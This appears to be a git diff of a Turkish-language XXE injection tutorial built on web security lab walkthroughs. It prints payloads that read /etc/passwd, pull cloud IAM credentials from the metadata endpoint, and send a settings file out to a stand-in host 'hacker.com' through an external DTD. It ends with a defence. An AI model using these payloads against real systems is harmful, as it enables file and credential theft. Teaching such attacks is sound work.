@@ -22,7 +22,7 @@ XML belgesinin okunması ve verilerin buradan yapılandırılmış bir biçimde 
 
 ## XML Nerede?
 
-![alt text](image.png)
+!![alt text](<WebSec101 0x07_ss/image.png>)
 
 Görselde iki tane web uygulaması örnek veriliyor. Burada bu iki web uygulamasının da birbirinden farklı olduğu varsayılmış ve bu bilgilere dayanarak iki uygulama da etkileşim halindedir. Ancak bu iki uygulamanın etkileşim halinde olabilmesi için ortak bir protokol kullanması gerekir(görselde bu protocol **http**dir.) Aynı zamanda **Data(veri)**'nın da iki uygulamanın anlayabileceği bir formatta olması gerekir. İşte burada da **XML** devreye girmektedir. **Yalnız, bir web uygulamasının **XML**'i kullanabilmesi için onu parse(ayrıştma) etmesi gerekir.**
 
@@ -93,44 +93,44 @@ Evet görüldüğü üzere **writer** **keyword**ünün(anahtar kelime) beslendi
 
 * Access the Lab diyelim ve devam edelim;
 
-![alt text](image-1.png)
+![alt text](<WebSec101 0x07_ss/image-1.png>)
 
 * Şimdi bu ekranda ilk bulmamız gereken şey 'Check Stock' isimli bir özellik. Çünkü bu özelliğin aslında XML parsing yaptığı bize söylenmişti dolayısıyla bunu arayalım; 
 
-![alt text](image-2.png)
+![alt text](<WebSec101 0x07_ss/image-2.png>)
 
 * **Your Virtual Journey Starts Here** yazan yere tıkladığımızda bahsettiğimiz **Check Stock** özelliği burada karşımıza çıkacaktır. **Check Stock** tuşuna basalım ve Burpsuite uygulamasının **Proxy-->HTTP History** kısmına gelelim. Burada az önce yaptığmız Check Stock sorgusunu aramalıyız;
 
-![alt text](image-3.png)
+![alt text](<WebSec101 0x07_ss/image-3.png>)
 
 * Buradaki **Requesti** **Repeater'a** yollayalım ve o sekmeye geçelim;
 
-![alt text](image-4.png)
+![alt text](<WebSec101 0x07_ss/image-4.png>)
 
 * Send tuşuna basmadan önce 2 sayısının yanına a yazalım ve send tuşuna basalım;
 
-![alt text](image-17.png)
+![alt text](<WebSec101 0x07_ss/image-17.png>)
 
 * Görüldüğü üzere burada bir **input validation(girdi doğrulama)** var. **Product Id** kısmına girilecek değerin **integer** olması isteniyor. Yanlış girildiğinde ise **response** kısmında bize bir geri dönüş oluyor. İşte burada aslında sunucunun bize bu geri dönüşünü verileri çekmek için kullanacağız. Tıpkı **error based sql injection**'da olduğu gibi. Bunu yapmak içinde devam ediyoruz;
 
 
 * Evet aşağıdaki satırda xml parsing yapıldığını görüyoruz. Yukarıdaki örnekte **<!DOCTYPE person [<!ENTITY writer SYSTEM "http://x.com/">]>** yazabildiğimizi aklımıza getirelim. Bu işlem burada da çalışacaktır. Ancak az bir şey değiştirmeliyiz. Bu kodu parsingten önceki kısma yapıştıralım ve x.com yazan yere file:////etc/passwd yazalım ve son hali; <!DOCTYPE person [<!ENTITY writer SYSTEM "file:////etc/passwd">]> olsun. Ardından bunu gösterdiğim yere yapıştıralım;
 
-![alt text](image-5.png)
+![alt text](<WebSec101 0x07_ss/image-5.png>)
 
 * Kodun son hali bu şekilde ve aynı zamanda product Id yazan kısma **&writer;** yazdık ki referans olarak çağırdığımız içeriği görebilelim(Çünkü id yerine integer değer girmediğimizde error veriyordu. Ancak error verirken geri dönüş olarak yazdığımız değer de geliyordu. İşte bu değer yerine **&writer;** yazdığımızda aslında referans olarak çağırdığımız değer gelecek ve o referans değeri de adrese işaret ettiğinden o adresteki verileri görebileceğiz.). Bunlar tamamlandıktan sonra **Send** tuşuna basalım ve Response kısmında artık şifreleri görebiliyor olacağız;
 
-![alt text](image-6.png)
+![alt text](<WebSec101 0x07_ss/image-6.png>)
 
 * Böylelikle alıştırma da tamamlanmış oluyor.
 
 * Burada yaptığımız aslında bir özellik için veri çeken sitenin XML parsing'i yapışını kendi lehimize kullanmak oldu;
 
-![alt text](image-7.png)
+![alt text](<WebSec101 0x07_ss/image-7.png>)
 
 * Yukarıdaki resimde de görüleceği üzere uygulamanın tek yaptığı product id'lerini xml parsing yaparak çağırmaktı. Ancak biz xml'e ulaşabildiğimizden onun dtd özelliğinden yararlanarak bir entity oluşturduk ki referans olarak da olsa verileri görebilelim. Bu şekilde **&writer;** yazdığımız için aslında **&writer;**'a karşılık gelen **file:////etc/passwd** verilerinin olduğu adresi görebiliyor olduk. Ancak dikkat etmeliyiz ki bunu kod hata verdiği halde görebildik; 
 
-![alt text](image-8.png)
+![alt text](<WebSec101 0x07_ss/image-8.png>)
 
 * Görüldüğü üzere **Invalid Product Id(yanlış ürün kimliği)** hatası vermesine rağmen bize referans olarak çağrılan içerikleri gösterdi. Bu aslında XML açığından faydalanmamız ile mümkün oldu. 
 
@@ -147,35 +147,35 @@ Evet görüldüğü üzere **writer** **keyword**ünün(anahtar kelime) beslendi
 
 * Access the Lab diyerek devam edelim;
 
-![alt text](image-9.png)
+![alt text](<WebSec101 0x07_ss/image-9.png>)
 
 * Çıkan ekrandan herhangi bir ürüne gelip **'View Details'** tuşuna basalım;
 
-![alt text](image-10.png)
+![alt text](<WebSec101 0x07_ss/image-10.png>)
 
 * Çıkan ekranda **Check Stock** tuşuna basalım ve burpsuite üzerinden bu sorguyu yakalayalım;
 
-![alt text](image-11.png)
+![alt text](<WebSec101 0x07_ss/image-11.png>)
 
 * Burada sorgumuzu görebiliyoruz ve yine aşağıda xml parserlar görüyoruz. Bu sorguyu Repeater'a yollayalım ve o sekmeye geçelim;
 
-![alt text](image-12.png)
+![alt text](<WebSec101 0x07_ss/image-12.png>)
 
 * Evet şimdi yine geçen alıştırmada yaptığımız gibi **<!DOCTYPE person [<!ENTITY writer SYSTEM "file:////etc/passwd">]>** kodunu yazacağız. Ancak en son kısma alıştırmadan önce bize söylenen **http://169.254.169.254/** kodunu yazacağız. Bununla birlikte son kodun son hali **<!DOCTYPE person [<!ENTITY writer SYSTEM "http://169.254.169.254/">]>** oluyor. Şimdi bu kodu geçen seferki gibi yapıştıralım;
 
-![alt text](image-13.png)
+![alt text](<WebSec101 0x07_ss/image-13.png>)
 
 * Bir aşağısındaki 2 yazan yere yine **&writer;** yazalım ki  xml parsing yapıp girdiğimiz adresten veri çekebilelim. Yazdıktan sonra **Send** diyelim;
 
-![alt text](image-14.png)
+![alt text](<WebSec101 0x07_ss/image-14.png>)
 
 * Response ekranında; **"Invalid product ID: latest"** çıktısı geldi. Burada aslında ürün idsinin yanlış olduğunu söylüyor ve onun yanında **latest** isminde bir veri çıkartmış bu veriyi de **http://169.254.169.254/latest** şeklinde ekleyelim ve tekrar **Send** tuşuna basalım;
 
-![alt text](image-15.png)
+![alt text](<WebSec101 0x07_ss/image-15.png>)
 
 * Evet bu sefer de **meta-data** verisi geldi. Bunu da **http://169.254.169.254/latest/meta-data** şeklinde ekleyelim. Bir sonrakinde de verirse(ki verecek) yine o vereceği veriyi de yaptığımız gibi son kısma ekleyelim ve gidebildiğimiz kadar gidelim;
 
-![alt text](image-16.png)
+![alt text](<WebSec101 0x07_ss/image-16.png>)
 
 * Gördüğümüz gibi bir kaç tane daha veriyi de ekleyince verilere ulaşabildik. Verdiği veriler sonrasındaki kodumuzun son hali; **<!DOCTYPE person [<!ENTITY writer SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>** şekline büründü. Dikkat edersek sanki bilgisayarda bir dosya arıyormuşuz gibi ''**/**'' koyup çeşitli dosya ismi koyarak admin dosyasına kadar geldik ve oradan verileri görür hale geldik. 
 
@@ -202,16 +202,36 @@ Yukarıdaki alıştırmalar XXE yapabilmiştik. Bunu yapabilmemizin nedeni aslı
   %trick;
 ]>
 ```
+* Hacker yukarıdaki kodu web application'a yolluyor;
 
-Yukarıdaki kod örneğinde **http://hacker.com/test.dtd** adresini **remote** keyword'ü üzerinden okuyabilmemizi sağlayacak bir kod örneği var.
+![alt text](<WebSec101 0x07_ss/image-18.png>)
 
-http://hacker.com/test.dtd;
+* Basitçe diyoruz ki **hacker.com** adresinde bir **test.dtd** var onu **remote** isminde alır mısın.  Bunun peşinden de **%remote;** yazılmış. Bu da parser'a remote otamatik olarak yazılsın ve değerler alınsın demek(yukarıdaki örnekte yapmıştık.).
+
+* Bu kodu aldıktan sonra web uygulaması hacker.com'a test.dtd dosyasını okumak için gidiyor;
+
+![alt text](<WebSec101 0x07_ss/image-19.png>)
+
+* hacker.com'dan da cevap olarak aşağıdaki kod dönüyor ; 
 ```XML
 <!ENTITY % payl SYSTEM "file://c:/inetpub/wwwroot/apps/webmail//app_data//settings/settings.xml">
-<!--Yukarıdaki kod settings.xml adresine gider, onu okur ve entity'nin içerisine koyar. Bu durumda içerisine koyduğu veriyi
-de &payl; kodunu çağırarak okuyabiliriz.-->
 <!ENTITY % int "<!ENTITY % trick SYSTEM "http://hacker.com/?p=%payl;'>">
-<!--Görüldüğü üzere &payl; kodu yukarıdaki adresin içine saklanmış. Yani aslında bu sayede settings.xml dosyasını okuyabilir olacağız. -->
 ```
+![alt text](<WebSec101 0x07_ss/image-20.png>)
+
+* Bu kodda da aslında dediğimiz şey, **settings.xml** dosyasını oku ve **payl** değişkenine koy. Ardından **int** ve **trick** isimli iki tane daha değişken tanımlanmış ve orada da **hacker.com'a** bir **request** daha gönder ve ona da **payl** isimli değişkenin değerini ver denmiş. Yani aslında web uygulamasından aldığımız xml değerini parse etmeden hacker.com'a gönderiyoruz. Böylelikle parsing yapmadan veriye ulaşmış oluyoruz. 
+
+* 4. adımda web uygulaması settings.xml dosyasını okur.
+
+* 5. adımda ise okunan bu dosya hacker.com'a gönderilir. 
 
 
+
+
+# XXE nasıl engellenir
+
+**xml parser'ı** **disallow-doctype-decl** edilirse artık **!DOCTYPE** deklare edilemez hale gelir ve xxe engellenir. 
+
+# KAYNAK
+
+[Web Security 0x07 | XML Parserlar ve XML external entity (XXE) Injection](https://www.youtube.com/watch?v=-BPnSQou8yw&list=PLwP4ObPL5GY940XhCtAykxLxLEOKCu0nT&index=7)
